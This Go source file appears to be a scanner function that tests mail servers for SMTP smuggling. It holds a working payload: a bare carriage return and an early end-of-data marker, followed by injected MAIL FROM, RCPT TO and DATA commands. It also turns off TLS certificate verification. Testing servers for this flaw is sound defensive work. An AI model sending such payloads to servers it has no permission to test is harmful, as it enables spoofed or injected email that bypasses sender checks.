package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"net"
	"strings"
	"time"
)

type SmugglingResult struct {
	Accepted bool
	Response string
	Error    error
}

func TestSMTPSmuggling(addr string, mailFrom string, rcptTo string, useTLS bool) SmugglingResult {
	var res SmugglingResult

	dialer := net.Dialer{Timeout: 10 * time.Second}
	conn, err := dialer.Dial("tcp", addr)
	if err != nil {
		res.Error = err
		return res
	}
	defer conn.Close()

	reader := bufio.NewReader(conn)

	// Read banner
	banner, err := reader.ReadString('\n')
	if err != nil {
		res.Error = err
		return res
	}

	// Optional STARTTLS
	if useTLS {
		fmt.Fprintf(conn, "EHLO mxcheck.local\r\n")
		reader.ReadString('\n')

		fmt.Fprintf(conn, "STARTTLS\r\n")
		_, err = reader.ReadString('\n')
		if err != nil {
			res.Error = err
			return res
		}

		tlsConn := tls.Client(conn, &tls.Config{InsecureSkipVerify: true})
		if err := tlsConn.Handshake(); err != nil {
			res.Error = err
			return res
		}

		conn = tlsConn
		reader = bufio.NewReader(conn)
	}

	// Basic handshake
	fmt.Fprintf(conn, "EHLO mxcheck.local\r\n")
	for {
		line, err := reader.ReadString('\n')
		if err != nil || strings.HasPrefix(line, "250 ") {
			break
		}
	}

	// MAIL FROM / RCPT TO
	fmt.Fprintf(conn, "MAIL FROM:<%s>\r\n", mailFrom)
	reader.ReadString('\n')

	fmt.Fprintf(conn, "RCPT TO:<%s>\r\n", rcptTo)
	reader.ReadString('\n')

	// Enter DATA phase
	fmt.Fprintf(conn, "DATA\r\n")
	reader.ReadString('\n')

	// Minimal smuggling payload
	payload := "" +
		"From: " + mailFrom + "\r\n" +
		"To: " + rcptTo + "\r\n" +
		"Subject: Test\r\n\r\n" +
		"Before smuggling\r\n" +
		"\r" + // CR without LF
		".\r\n" + // premature DATA termination
		"MAIL FROM:<x@example.com>\r\n" +
		"RCPT TO:<y@example.com>\r\n" +
		"DATA\r\n" +
		"Smuggled block\r\n" +
		".\r\n"

	// Send payload
	fmt.Fprintf(conn, "%s", payload)

	// Read server response
	lines := []string{}
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	for {
		line, err := reader.ReadString('\n')
		if err != nil {
			break
		}
		lines = append(lines, line)
		if strings.HasPrefix(line, "250 ") || strings.HasPrefix(line, "550 ") {
			break
		}
	}

	res.Response = banner + strings.Join(lines, "")
	for _, l := range lines {
		if strings.HasPrefix(l, "250 ") {
			res.Accepted = true
			break
		}
	}

	fmt.Fprintf(conn, "QUIT\r\n")
	return res
}
